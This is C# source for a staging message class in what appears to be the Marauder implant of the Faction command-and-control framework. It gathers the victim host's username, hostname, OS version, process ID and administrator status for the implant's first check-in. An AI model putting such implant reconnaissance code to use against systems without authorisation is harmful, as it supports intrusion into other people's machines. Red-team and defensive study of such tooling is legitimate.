using System;
using System.Diagnostics;
using System.Security.Principal;

using Faction.Modules.Dotnet.Common;
using Marauder.Services;

namespace Marauder.Objects {

  public class StagingMessage
  {
    public string StagingId;
    public string Username;
    public string Hostname;
    public string OperatingSystem;
    public int PID;
    public bool Admin;
    public string InternalIP;

    public StagingMessage() {
      if (String.IsNullOrEmpty(State.StagingId)) {
        State.StagingId = CryptoService.GenerateSecureString(8);
      }
      this.StagingId = State.StagingId;
      this.Username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
      this.Hostname = Environment.MachineName;
      this.OperatingSystem = Environment.OSVersion.ToString();
      this.PID = Process.GetCurrentProcess().Id;
      using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
      {
          WindowsPrincipal principal = new WindowsPrincipal(identity);
          this.Admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
      }
    }
  }
}
